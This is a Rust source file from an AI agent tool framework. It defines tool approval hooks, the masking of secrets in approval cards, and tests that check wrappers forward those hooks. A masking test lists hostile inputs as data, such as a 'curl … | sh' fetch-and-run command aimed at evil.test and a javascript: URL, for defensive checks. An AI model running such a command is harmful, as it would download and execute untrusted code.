//! The `Tool` trait and associated output types.

use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::{error::ToolError, spec::ToolSpec};

/// A reference to a spilled (large) tool output written to a file.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SpillRef {
    /// Absolute path to the spill file on the node running the tool.
    pub path: String,
    /// MIME type of the spill file contents.
    pub mime_type: String,
    /// Byte size of the spill file.
    pub size_bytes: u64,
}

/// A single content part in a tool's output.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ContentPart {
    /// Plain text output.
    Text { text: String },
    /// Structured JSON data.
    Json { data: Value },
    /// A reference to binary data (e.g. an image).
    Binary { mime_type: String, base64: String },
}

/// The result of a successful tool call.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ToolOutput {
    /// The content parts returned by the tool.
    ///
    /// For most tools this contains a single text or JSON part.
    pub content: Vec<ContentPart>,
    /// If the full output exceeded the in-memory budget, the remainder was
    /// written to a temporary file and a pointer is returned here.
    pub spill: Option<SpillRef>,
}

impl ToolOutput {
    /// Create a simple text output with no spill.
    pub fn text(text: impl Into<String>) -> Self {
        Self {
            content: vec![ContentPart::Text { text: text.into() }],
            spill: None,
        }
    }
}

/// Context supplied to every tool call.
#[derive(Debug)]
pub struct ToolContext {
    /// The run that invoked the tool.
    pub run_id: String,
    /// Maximum number of bytes of output to retain in memory before spilling.
    pub max_inline_bytes: usize,
    /// Bot that invoked the tool. `None` when the caller is not a bot.
    ///
    /// MCP servers with a `bots` allowlist refuse a call whose id is missing
    /// or not listed. `None` here is not "every bot".
    pub bot_id: Option<String>,
}

impl Default for ToolContext {
    fn default() -> Self {
        Self {
            run_id: String::new(),
            max_inline_bytes: 1024 * 1024, // 1 MiB
            bot_id: None,
        }
    }
}

/// A callable tool.
///
/// **Delegation rule:** a `Tool` that forwards calls to another tool (a
/// wrapper, bridge or dispatcher) must also forward [`Tool::always_ask`],
/// [`Tool::approval_details`] and [`Tool::approval_closed`] to it, otherwise
/// the wrapped tool's confirmation guarantees are silently lost. Prefer
/// implementing [`ToolWrapper`] (where the hooks are required methods with no
/// defaults); a repository test (`delegating_tools_forward_the_approval_hooks`)
/// also inspects every `impl Tool` AST and fails for a new delegating
/// implementation that does not forward them.
///
/// Implementors describe themselves via [`Tool::spec`] and execute via
/// [`Tool::call`].  All implementations must be `Send + Sync` so they can be
/// shared across async tasks.
#[async_trait]
pub trait Tool: Send + Sync {
    /// Return the static specification for this tool.
    fn spec(&self) -> &ToolSpec;

    /// Whether the bot `bot_id` (`None` = no bot) may see this tool in
    /// discovery and in the model's tool list.  Default: every bot.  This is
    /// a visibility filter only; a tool that restricts callers must still
    /// enforce that in [`Tool::call`].
    fn visible_to(&self, _bot_id: Option<&str>) -> bool {
        true
    }

    /// Execute the tool with the given `input` and return its output.
    async fn call(&self, ctx: &ToolContext, input: Value) -> Result<ToolOutput, ToolError>;

    /// Structured facts an approval card should show for this exact call
    /// (computed before the user is asked; carried on the `approval_needed`
    /// event). `Ok(None)` (the default) means the generic card is enough.
    ///
    /// # Errors
    /// The call is invalid and must not be offered for approval: the error
    /// goes straight back to the model.
    async fn approval_details(
        &self,
        _ctx: &ToolContext,
        _input: &Value,
    ) -> Result<Option<Value>, ToolError> {
        Ok(None)
    }

    /// The input of this call as every place that is not the tool itself may
    /// show it: the approval card and summary, the event stream, the journal,
    /// the stored step records, and the Telegram, CLI and desktop renderers.
    ///
    /// `Ok`/`Some(view)` replaces the raw input there; `None` (the default)
    /// means the raw input may be shown. The tool still receives the raw input
    /// in [`Tool::call`]: a value typed into a password field must reach the
    /// field and never any of those places. Build the replacement with
    /// [`masked_secret`] so the user still sees *which* field gets a masked
    /// value, and leave ordinary text alone: approvals must stay readable.
    ///
    /// Must be cheap and must not change anything: it runs for every call,
    /// before the user is asked, from facts the tool already holds (no new
    /// round trip to a page or an app).
    async fn display_input(&self, _ctx: &ToolContext, _input: &Value) -> Option<Value> {
        None
    }

    /// Called when an approval that [`Tool::approval_details`] prepared ends
    /// without the call running (denied, cancelled, timed out, rejected before
    /// it was shown, or approved but never executed), so the tool can drop what
    /// it froze for it. `token` is the `approval_ref` string the tool put in
    /// its details (the loop removes it before the card is shown): only what
    /// was created for that very approval may be dropped.
    fn approval_closed(&self, _ctx: &ToolContext, _input: &Value, _token: Option<&str>) {}

    /// `true` when the call must always be confirmed by the user: a policy
    /// that would allow it is raised to "ask", and neither "always allow"
    /// grants (tool or category) nor "this chat" grants waive the ask. Only an
    /// outright deny is stricter. For tools that delegate future authority.
    fn always_ask(&self) -> bool {
        false
    }
}

/// A wrapper trait for tools that delegate to another [`Tool`].
///
/// Unlike [`Tool`], the approval hooks (`always_ask`, `approval_details`,
/// `approval_closed`) have no default implementations here, so any wrapper
/// implementing [`ToolWrapper`] fails to compile if it forgets to forward them.
#[async_trait]
pub trait ToolWrapper: Send + Sync {
    /// Return the static specification for this tool.
    fn spec(&self) -> &ToolSpec;

    /// Whether the bot `bot_id` (`None` = no bot) may see this tool.
    fn visible_to(&self, _bot_id: Option<&str>) -> bool {
        true
    }

    /// Execute the tool with the given `input` and return its output.
    ///
    /// # Errors
    /// Returns [`ToolError`] if input is invalid or tool execution fails.
    async fn call(&self, ctx: &ToolContext, input: Value) -> Result<ToolOutput, ToolError>;

    /// Forward [`Tool::always_ask`] to the wrapped tool.
    fn always_ask(&self) -> bool;

    /// Forward [`Tool::approval_details`] to the wrapped tool.
    ///
    /// # Errors
    /// Returns [`ToolError`] if the wrapped tool rejects the call.
    async fn approval_details(
        &self,
        ctx: &ToolContext,
        input: &Value,
    ) -> Result<Option<Value>, ToolError>;

    /// Forward [`Tool::approval_closed`] to the wrapped tool.
    fn approval_closed(&self, ctx: &ToolContext, input: &Value, token: Option<&str>);

    /// Forward [`Tool::display_input`] to the wrapped tool.
    async fn display_input(&self, ctx: &ToolContext, input: &Value) -> Option<Value>;
}

#[async_trait]
impl<W: ToolWrapper> Tool for W {
    fn spec(&self) -> &ToolSpec {
        ToolWrapper::spec(self)
    }

    fn visible_to(&self, bot_id: Option<&str>) -> bool {
        ToolWrapper::visible_to(self, bot_id)
    }

    async fn call(&self, ctx: &ToolContext, input: Value) -> Result<ToolOutput, ToolError> {
        ToolWrapper::call(self, ctx, input).await
    }

    async fn approval_details(
        &self,
        ctx: &ToolContext,
        input: &Value,
    ) -> Result<Option<Value>, ToolError> {
        ToolWrapper::approval_details(self, ctx, input).await
    }

    fn approval_closed(&self, ctx: &ToolContext, input: &Value, token: Option<&str>) {
        ToolWrapper::approval_closed(self, ctx, input, token);
    }

    fn always_ask(&self) -> bool {
        ToolWrapper::always_ask(self)
    }

    async fn display_input(&self, ctx: &ToolContext, input: &Value) -> Option<Value> {
        ToolWrapper::display_input(self, ctx, input).await
    }
}

/// The mask a secret value is shown as. Never followed by any part of the value.
pub const SECRET_MASK: &str = "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}";

/// The longest text a mask may stand for. A mask is for a credential (a
/// password, a card number, a one-time code), never for a message, a command
/// or a URL: anything longer is shown in full so the user can read it.
pub const MASK_MAX_CHARS: usize = 128;

/// Whether `value` may be shown as a mask at all: one line of 1..=
/// [`MASK_MAX_CHARS`] characters with no whitespace or control characters. A
/// sentence, a command line, a multi-line text or a long structured value is
/// or a URL is never maskable, whatever the field claims to be, so a mask can never hide
/// what the user has to read to approve a call.
#[must_use]
pub fn is_maskable_secret(value: &str) -> bool {
    let n = value.chars().count();
    (1..=MASK_MAX_CHARS).contains(&n)
        && !value.chars().any(|c| c.is_whitespace() || c.is_control())
        && !value.contains("://")
        && !value.to_ascii_lowercase().starts_with("javascript:")
        && !is_masked_secret(value)
}

/// The placeholder shown instead of a secret `value`: the mask, why it is
/// secret (`source`, for example `password field`) and a coarse length class
/// (`empty`, `short`, `medium`, `long`). Never the value, a prefix, a suffix
/// or its exact length.
#[must_use]
pub fn masked_secret(value: &str, source: &str) -> String {
    let class = match value.chars().count() {
        0 => "empty",
        1..=7 => "short",
        8..=15 => "medium",
        _ => "long",
    };
    format!("{SECRET_MASK} ({source}, {class})")
}

/// [`masked_secret`] when `value` may be masked ([`is_maskable_secret`]);
/// `None` when it must be shown as it is.
#[must_use]
pub fn display_secret(value: &str, source: &str) -> Option<String> {
    is_maskable_secret(value).then(|| masked_secret(value, source))
}

/// Whether `text` is a placeholder made by [`masked_secret`]. Such text is a
/// display value, never something to type: the tools refuse it.
#[must_use]
pub fn is_masked_secret(text: &str) -> bool {
    text.starts_with(SECRET_MASK)
}

const SECRET_REF_OPEN: &str = " [ref ";

/// `placeholder` tagged with the opaque handle `id` of the in-memory value it
/// stands for (the stored record keeps only this; see [`secret_ref_of`]).
#[must_use]
pub fn with_secret_ref(placeholder: &str, id: &str) -> String {
    format!("{placeholder}{SECRET_REF_OPEN}{id}]")
}

/// The handle [`with_secret_ref`] put on `text`.
#[must_use]
pub fn secret_ref_of(text: &str) -> Option<&str> {
    if !is_masked_secret(text) {
        return None;
    }
    let (_, rest) = text.rsplit_once(SECRET_REF_OPEN)?;
    rest.strip_suffix(']')
        .filter(|id| !id.is_empty() && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-'))
}

/// The refusal for a tool asked to type a display placeholder as if it were a
/// value (a model copying its own masked history, a replay given the mask).
#[must_use]
pub fn placeholder_refusal() -> String {
    "that text is a display placeholder for a hidden secret, not a value; it was not typed. \
     Ask the user for the real value."
        .to_owned()
}

#[cfg(test)]
mod delegation_guard {
    use std::collections::{BTreeMap, BTreeSet};
    use std::path::{Path, PathBuf};

    use syn::visit::{self, Visit};
    use syn::{
        Expr, Fields, Generics, ImplItem, ItemEnum, ItemImpl, ItemStruct, PathSegment, Type,
    };

    /// `file :: type` pairs whose tools dispatch to other tools (or hold a
    /// registry / gate) without forwarding the approval hooks themselves, each
    /// reviewed and why. The list must match the repository EXACTLY: a new
    /// delegating `impl Tool` fails this test until it forwards
    /// `always_ask` / `approval_details` / `approval_closed` (or implements
    /// `ToolWrapper`) or is added here with a reason; an entry that no longer
    /// matches must be removed.
    const REVIEWED: &[(&str, &str, &str)] = &[
        (
            "agent-router/src/surface.rs",
            "FindTool",
            "find_tool only lists tools; it calls none",
        ),
        (
            "agent-router/src/surface.rs",
            "UseTool",
            "the loop resolves `use_tool` to its TARGET by name and runs decide + approval_details against the target, then the target's own hooks apply",
        ),
        (
            "builtin-tools/src/script.rs",
            "ScriptTool",
            "script_run: every inner call goes through the loop's ToolGate (decide + approval_details)",
        ),
        (
            "workflow-replay/src/tool.rs",
            "WorkflowRun",
            "workflow_run: every step goes through the loop's ToolGate (decide + approval_details)",
        ),
        (
            "agent-router/src/surface.rs",
            "GetToolDetails",
            "get_tool_details only describes tools; it calls none",
        ),
    ];

    const DELEGATING_TYPES: &[&str] = &[
        "Tool",
        "ToolRegistry",
        "ToolGate",
        "ToolSurface",
        "Discovery",
    ];

    const REQUIRED_HOOKS: &[&str] = &[
        "always_ask",
        "approval_details",
        "approval_closed",
        "display_input",
    ];

    #[derive(Default)]
    struct TypeInfo {
        field_types: Vec<Type>,
        bounded_params: BTreeSet<String>,
    }

    struct IdentFinder<'a> {
        targets: &'a BTreeSet<String>,
        found: bool,
    }

    impl<'ast> Visit<'ast> for IdentFinder<'_> {
        fn visit_path_segment(&mut self, node: &'ast PathSegment) {
            if self.targets.contains(&node.ident.to_string()) {
                self.found = true;
            }
            visit::visit_path_segment(self, node);
        }
    }

    fn type_mentions_any(ty: &Type, targets: &BTreeSet<String>) -> bool {
        let mut finder = IdentFinder {
            targets,
            found: false,
        };
        finder.visit_type(ty);
        finder.found
    }

    fn delegating_set() -> BTreeSet<String> {
        DELEGATING_TYPES.iter().map(|s| (*s).to_owned()).collect()
    }

    fn bounded_type_params(generics: &Generics) -> BTreeSet<String> {
        let targets = delegating_set();
        let mut out = BTreeSet::new();
        for param in generics.type_params() {
            let has_bound = param.bounds.iter().any(|b| {
                let mut finder = IdentFinder {
                    targets: &targets,
                    found: false,
                };
                finder.visit_type_param_bound(b);
                finder.found
            });
            if has_bound {
                out.insert(param.ident.to_string());
            }
        }
        if let Some(wc) = &generics.where_clause {
            for pred in &wc.predicates {
                if let syn::WherePredicate::Type(pt) = pred {
                    let has_bound = pt.bounds.iter().any(|b| {
                        let mut finder = IdentFinder {
                            targets: &targets,
                            found: false,
                        };
                        finder.visit_type_param_bound(b);
                        finder.found
                    });
                    if has_bound
                        && let Type::Path(tp) = &pt.bounded_ty
                        && let Some(ident) = tp.path.get_ident()
                    {
                        out.insert(ident.to_string());
                    }
                }
            }
        }
        out
    }

    fn field_types_of(fields: &Fields) -> Vec<Type> {
        match fields {
            Fields::Named(f) => f.named.iter().map(|x| x.ty.clone()).collect(),
            Fields::Unnamed(f) => f.unnamed.iter().map(|x| x.ty.clone()).collect(),
            Fields::Unit => Vec::new(),
        }
    }

    struct Collector {
        types: BTreeMap<String, Vec<TypeInfo>>,
        tool_impls: Vec<ItemImpl>,
    }

    impl<'ast> Visit<'ast> for Collector {
        fn visit_item_struct(&mut self, node: &'ast ItemStruct) {
            self.types
                .entry(node.ident.to_string())
                .or_default()
                .push(TypeInfo {
                    field_types: field_types_of(&node.fields),
                    bounded_params: bounded_type_params(&node.generics),
                });
            visit::visit_item_struct(self, node);
        }

        fn visit_item_enum(&mut self, node: &'ast ItemEnum) {
            let field_types = node
                .variants
                .iter()
                .flat_map(|v| field_types_of(&v.fields))
                .collect();
            self.types
                .entry(node.ident.to_string())
                .or_default()
                .push(TypeInfo {
                    field_types,
                    bounded_params: bounded_type_params(&node.generics),
                });
            visit::visit_item_enum(self, node);
        }

        fn visit_item_impl(&mut self, node: &'ast ItemImpl) {
            if let Some((_, path, _)) = &node.trait_
                && path.segments.last().is_some_and(|s| s.ident == "Tool")
            {
                self.tool_impls.push(node.clone());
            }
            visit::visit_item_impl(self, node);
        }
    }

    fn self_type_name(ty: &Type) -> Option<String> {
        match ty {
            Type::Path(tp) => tp.path.segments.last().map(|s| s.ident.to_string()),
            Type::Group(g) => self_type_name(&g.elem),
            Type::Paren(p) => self_type_name(&p.elem),
            _ => None,
        }
    }

    fn is_bare_self(expr: &Expr) -> bool {
        match expr {
            Expr::Path(p) => p.path.is_ident("self"),
            Expr::Reference(r) => is_bare_self(&r.expr),
            Expr::Paren(p) => is_bare_self(&p.expr),
            Expr::Group(g) => is_bare_self(&g.expr),
            _ => false,
        }
    }

    struct HookCallFinder<'a> {
        hook: &'a str,
        found: bool,
    }

    impl<'ast> Visit<'ast> for HookCallFinder<'_> {
        fn visit_expr_method_call(&mut self, node: &'ast syn::ExprMethodCall) {
            if node.method == self.hook && !is_bare_self(&node.receiver) {
                self.found = true;
            }
            visit::visit_expr_method_call(self, node);
        }

        fn visit_expr_call(&mut self, node: &'ast syn::ExprCall) {
            if let Expr::Path(p) = &*node.func
                && p.path.segments.len() >= 2
                && p.path.segments.last().is_some_and(|s| s.ident == self.hook)
            {
                self.found = true;
            }
            visit::visit_expr_call(self, node);
        }
    }

    fn forwards_hook(impl_item: &ItemImpl, hook: &str) -> bool {
        impl_item.items.iter().any(|item| {
            let ImplItem::Fn(f) = item else {
                return false;
            };
            if f.sig.ident != hook {
                return false;
            }
            let mut finder = HookCallFinder { hook, found: false };
            finder.visit_block(&f.block);
            finder.found
        })
    }

    fn is_delegating_impl(
        impl_item: &ItemImpl,
        self_name: &str,
        types: &BTreeMap<String, Vec<TypeInfo>>,
    ) -> bool {
        let impl_bounded = bounded_type_params(&impl_item.generics);
        if !impl_bounded.is_empty() {
            return true;
        }
        let Some(defs) = types.get(self_name) else {
            return false;
        };
        let targets = delegating_set();
        for def in defs {
            let mut all_targets = targets.clone();
            all_targets.extend(def.bounded_params.iter().cloned());
            if def
                .field_types
                .iter()
                .any(|ty| type_mentions_any(ty, &all_targets))
            {
                return true;
            }
        }
        false
    }

    /// Return the type names of delegating `impl Tool` blocks in `src` that do
    /// not genuinely forward all three approval hooks.
    fn missing_hooks_in_source(src: &str) -> Vec<String> {
        let file = syn::parse_file(src).expect("valid Rust source");
        let mut collector = Collector {
            types: BTreeMap::new(),
            tool_impls: Vec::new(),
        };
        collector.visit_file(&file);
        let mut out = Vec::new();
        for imp in &collector.tool_impls {
            let Some(name) = self_type_name(&imp.self_ty) else {
                continue;
            };
            if !is_delegating_impl(imp, &name, &collector.types) {
                continue;
            }
            let forwards_all = REQUIRED_HOOKS.iter().all(|hook| forwards_hook(imp, hook));
            if !forwards_all {
                out.push(name);
            }
        }
        out
    }

    fn rust_files(dir: &Path, out: &mut Vec<PathBuf>) {
        let Ok(rd) = std::fs::read_dir(dir) else {
            return;
        };
        for e in rd.flatten() {
            let p = e.path();
            let name = e.file_name();
            if p.is_dir() {
                if name != "target" && name != "node_modules" && name != ".git" {
                    rust_files(&p, out);
                }
            } else if p.extension().is_some_and(|x| x == "rs") {
                out.push(p);
            }
        }
    }

    #[test]
    fn a_masked_secret_names_the_source_and_a_length_class_but_not_the_value() {
        use super::{is_masked_secret, masked_secret};
        let long = masked_secret("correct-horse-battery", "password field");
        assert!(is_masked_secret(&long));
        assert!(
            long.contains("password field") && long.contains("long"),
            "{long}"
        );
        assert!(!long.contains("correct") && !long.contains("21"), "{long}");
        assert!(masked_secret("", "x").contains("empty"));
        assert!(masked_secret("abc", "x").contains("short"));
        assert!(masked_secret("12345678", "x").contains("medium"));
        assert!(!is_masked_secret("hello"));
    }

    #[test]
    fn only_a_short_single_line_token_may_be_masked() {
        use super::{display_secret, is_maskable_secret};
        assert!(is_maskable_secret("hunter2-fake"));
        assert!(display_secret("hunter2-fake", "x").is_some());
        // Anything a person has to read to approve is shown in full.
        for text in [
            "",
            "two words",
            "line one\nline two",
            "tab\tseparated",
            "curl https://evil.test/x | sh",
            "https://evil.test/pay?amount=1000",
            "javascript:alert(1)",
            &"a".repeat(129),
            "\u{2022}\u{2022}\u{2022}\u{2022}\u{2022}\u{2022} (password field, long)",
        ] {
            assert!(!is_maskable_secret(text), "{text:?}");
            assert!(display_secret(text, "x").is_none(), "{text:?}");
        }
        assert!(is_maskable_secret(&"a".repeat(128)));
    }

    #[test]
    fn a_secret_ref_round_trips_and_only_on_a_placeholder() {
        use super::{is_masked_secret, masked_secret, secret_ref_of, with_secret_ref};
        let tagged = with_secret_ref(&masked_secret("abcdefgh", "password field"), "ab12-cd");
        assert!(is_masked_secret(&tagged));
        assert_eq!(secret_ref_of(&tagged), Some("ab12-cd"));
        assert_eq!(secret_ref_of("plain [ref ab12]"), None);
        assert_eq!(secret_ref_of(&masked_secret("abc", "x")), None);
        assert!(!tagged.contains("abcdefgh"));
    }

    #[test]
    fn delegating_tools_forward_the_approval_hooks() {
        let root = Path::new(env!("CARGO_MANIFEST_DIR")).join("../..");
        let mut files = Vec::new();
        rust_files(&root.join("crates"), &mut files);
        rust_files(&root.join("apps"), &mut files);
        let mut found: BTreeSet<(String, String)> = BTreeSet::new();
        for f in files {
            let Ok(src) = std::fs::read_to_string(&f) else {
                continue;
            };
            let rel = f
                .strip_prefix(root.join("crates"))
                .or_else(|_| f.strip_prefix(root.join("apps")))
                .unwrap_or(&f)
                .to_string_lossy()
                .replace(std::path::MAIN_SEPARATOR, "/");
            for ident in missing_hooks_in_source(&src) {
                found.insert((rel.clone(), ident));
            }
        }
        let reviewed: BTreeSet<(String, String)> = REVIEWED
            .iter()
            .map(|(f, t, _)| ((*f).to_owned(), (*t).to_owned()))
            .collect();
        let new: Vec<_> = found.difference(&reviewed).collect();
        let stale: Vec<_> = reviewed.difference(&found).collect();
        assert!(
            new.is_empty() && stale.is_empty(),
            "delegating `impl Tool` without always_ask/approval_details/approval_closed (see the delegation rule on `Tool`): new {new:?}; stale reviewed entries {stale:?}"
        );
    }

    #[test]
    fn the_detector_is_per_impl_block_and_sees_delegating_fields() {
        let src = r"
struct A {
    inner: Arc<dyn Tool>,
}
impl Tool for A {
    fn call(&self) {}
}
struct B {
    n: u8,
}
impl Tool for B {
    fn always_ask(&self) -> bool { self.inner.always_ask() }
    async fn approval_details(&self, c: &ToolContext, i: &Value) -> Result<Option<Value>, ToolError> {
        self.inner.approval_details(c, i).await
    }
    fn approval_closed(&self, c: &ToolContext, i: &Value, t: Option<&str>) {
        self.inner.approval_closed(c, i, t);
    }
    async fn display_input(&self, c: &ToolContext, i: &Value) -> Option<Value> {
        self.inner.display_input(c, i).await
    }
}
";
        assert_eq!(missing_hooks_in_source(src), vec!["A"]);
    }

    #[test]
    #[allow(clippy::too_many_lines)]
    fn bypass_vectors_are_caught() {
        // 1. Box<dyn Tool>, Vec<Arc<dyn Tool>>, dyn Tool + Send + Sync, tuple struct,
        //    generic wrapper, qualified impl tool_registry::Tool.
        for (label, src) in [
            (
                "Box<dyn Tool>",
                "struct W { inner: Box<dyn Tool> } impl Tool for W { fn call(&self) {} }",
            ),
            (
                "Vec<Arc<dyn Tool>>",
                "struct W { inner: Vec<Arc<dyn Tool>> } impl Tool for W { fn call(&self) {} }",
            ),
            (
                "Arc<dyn Tool + Send + Sync>",
                "struct W { inner: Arc<dyn Tool + Send + Sync> } impl Tool for W { fn call(&self) {} }",
            ),
            (
                "tuple struct",
                "struct W(Arc<dyn Tool>); impl Tool for W { fn call(&self) {} }",
            ),
            (
                "generic impl<T: Tool>",
                "struct W<T>(T); impl<T: Tool> Tool for W<T> { fn call(&self) {} }",
            ),
            (
                "qualified trait path",
                "struct W { inner: Arc<dyn Tool> } impl tool_registry::Tool for W { fn call(&self) {} }",
            ),
            (
                "comment instead of fn",
                "struct W { inner: Arc<dyn Tool> } impl Tool for W { /* fn always_ask fn approval_details fn approval_closed */ }",
            ),
            (
                "empty stub fn approval_closed",
                r"
struct W { inner: Arc<dyn Tool> }
impl Tool for W {
    fn always_ask(&self) -> bool { self.inner.always_ask() }
    async fn approval_details(&self, c: &ToolContext, i: &Value) -> Result<Option<Value>, ToolError> {
        self.inner.approval_details(c, i).await
    }
    fn approval_closed(&self, _: &ToolContext, _: &Value, _: Option<&str>) {}
    async fn display_input(&self, c: &ToolContext, i: &Value) -> Option<Value> {
        self.inner.display_input(c, i).await
    }
}
",
            ),
            (
                "forgets approval_closed",
                r"
struct W { inner: Arc<dyn Tool> }
impl Tool for W {
    fn always_ask(&self) -> bool { self.inner.always_ask() }
    async fn approval_details(&self, c: &ToolContext, i: &Value) -> Result<Option<Value>, ToolError> {
        self.inner.approval_details(c, i).await
    }
    async fn display_input(&self, c: &ToolContext, i: &Value) -> Option<Value> {
        self.inner.display_input(c, i).await
    }
}
",
            ),
            (
                "forgets display_input",
                r"
struct W { inner: Arc<dyn Tool> }
impl Tool for W {
    fn always_ask(&self) -> bool { self.inner.always_ask() }
    async fn approval_details(&self, c: &ToolContext, i: &Value) -> Result<Option<Value>, ToolError> {
        self.inner.approval_details(c, i).await
    }
    fn approval_closed(&self, c: &ToolContext, i: &Value, t: Option<&str>) {
        self.inner.approval_closed(c, i, t);
    }
}
",
            ),
            (
                "stub display_input",
                r"
struct W { inner: Arc<dyn Tool> }
impl Tool for W {
    fn always_ask(&self) -> bool { self.inner.always_ask() }
    async fn approval_details(&self, c: &ToolContext, i: &Value) -> Result<Option<Value>, ToolError> {
        self.inner.approval_details(c, i).await
    }
    fn approval_closed(&self, c: &ToolContext, i: &Value, t: Option<&str>) {
        self.inner.approval_closed(c, i, t);
    }
    async fn display_input(&self, _: &ToolContext, _: &Value) -> Option<Value> { None }
}
",
            ),
        ] {
            assert_eq!(
                missing_hooks_in_source(src),
                vec!["W"],
                "failed to flag {label}"
            );
        }

        // 2. Column-0 closing brace inside a string literal must not truncate the impl,
        //    and genuine forwarding passes.
        let genuine = r#"
struct Good {
    inner: Box<dyn Tool + Send + Sync>,
}
impl tool_registry::Tool for Good {
    fn spec(&self) -> &ToolSpec {
        let _s = "
}
";
        self.inner.spec()
    }
    fn always_ask(&self) -> bool {
        self.inner.always_ask()
    }
    async fn approval_details(&self, c: &ToolContext, i: &Value) -> Result<Option<Value>, ToolError> {
        self.inner.approval_details(c, i).await
    }
    fn approval_closed(&self, c: &ToolContext, i: &Value, t: Option<&str>) {
        self.inner.approval_closed(c, i, t);
    }
    async fn display_input(&self, c: &ToolContext, i: &Value) -> Option<Value> {
        self.inner.display_input(c, i).await
    }
}
"#;
        assert!(missing_hooks_in_source(genuine).is_empty(), "{genuine}");
    }

    #[test]
    #[allow(clippy::too_many_lines)]
    fn tool_wrapper_trait_forwards_all_approval_hooks() {
        use crate::{Effect, ToolError, ToolSpec};
        use protocol::PermissionCategory;
        use std::sync::Arc;
        use std::sync::atomic::{AtomicBool, Ordering};

        struct Inner {
            spec: ToolSpec,
            closed: Arc<AtomicBool>,
        }

        #[async_trait::async_trait]
        impl crate::Tool for Inner {
            fn spec(&self) -> &ToolSpec {
                &self.spec
            }
            async fn call(
                &self,
                _ctx: &crate::ToolContext,
                _input: serde_json::Value,
            ) -> Result<crate::ToolOutput, ToolError> {
                Ok(crate::ToolOutput::text("ok"))
            }
            fn always_ask(&self) -> bool {
                true
            }
            async fn approval_details(
                &self,
                _ctx: &crate::ToolContext,
                _input: &serde_json::Value,
            ) -> Result<Option<serde_json::Value>, ToolError> {
                Ok(Some(serde_json::json!({"kind": "schedule"})))
            }
            fn approval_closed(
                &self,
                _ctx: &crate::ToolContext,
                _input: &serde_json::Value,
                _token: Option<&str>,
            ) {
                self.closed.store(true, Ordering::SeqCst);
            }
            async fn display_input(
                &self,
                _ctx: &crate::ToolContext,
                _input: &serde_json::Value,
            ) -> Option<serde_json::Value> {
                Some(serde_json::json!({"distinctive": "inner-view-7f3a"}))
            }
        }

        struct Wrap(Arc<dyn crate::Tool>);

        #[async_trait::async_trait]
        impl crate::ToolWrapper for Wrap {
            fn spec(&self) -> &ToolSpec {
                self.0.spec()
            }
            async fn call(
                &self,
                ctx: &crate::ToolContext,
                input: serde_json::Value,
            ) -> Result<crate::ToolOutput, ToolError> {
                self.0.call(ctx, input).await
            }
            fn always_ask(&self) -> bool {
                self.0.always_ask()
            }
            async fn approval_details(
                &self,
                ctx: &crate::ToolContext,
                input: &serde_json::Value,
            ) -> Result<Option<serde_json::Value>, ToolError> {
                self.0.approval_details(ctx, input).await
            }
            fn approval_closed(
                &self,
                ctx: &crate::ToolContext,
                input: &serde_json::Value,
                token: Option<&str>,
            ) {
                self.0.approval_closed(ctx, input, token);
            }
            async fn display_input(
                &self,
                ctx: &crate::ToolContext,
                input: &serde_json::Value,
            ) -> Option<serde_json::Value> {
                self.0.display_input(ctx, input).await
            }
        }

        let closed = Arc::new(AtomicBool::new(false));
        let inner = Arc::new(Inner {
            spec: ToolSpec {
                name: "w".into(),
                description: "w".into(),
                input_schema: serde_json::json!({"type": "object"}),
                effect: Effect::Write,
                category: PermissionCategory::System,
                platforms: vec![protocol::Platform::All],
            },
            closed: Arc::clone(&closed),
        });
        let wrapped: Arc<dyn crate::Tool> = Arc::new(Wrap(inner));
        assert!(wrapped.always_ask());
        wrapped.approval_closed(
            &crate::ToolContext::default(),
            &serde_json::json!({}),
            Some("tok"),
        );
        assert!(closed.load(Ordering::SeqCst));
        // The wrapper must show what the INNER tool says may be shown: a
        // default `None` anywhere in the chain would expose the raw input.
        let view = tokio::runtime::Builder::new_current_thread()
            .build()
            .unwrap()
            .block_on(
                wrapped.display_input(&crate::ToolContext::default(), &serde_json::json!({"a": 1})),
            );
        assert_eq!(
            view,
            Some(serde_json::json!({"distinctive": "inner-view-7f3a"}))
        );
    }
}
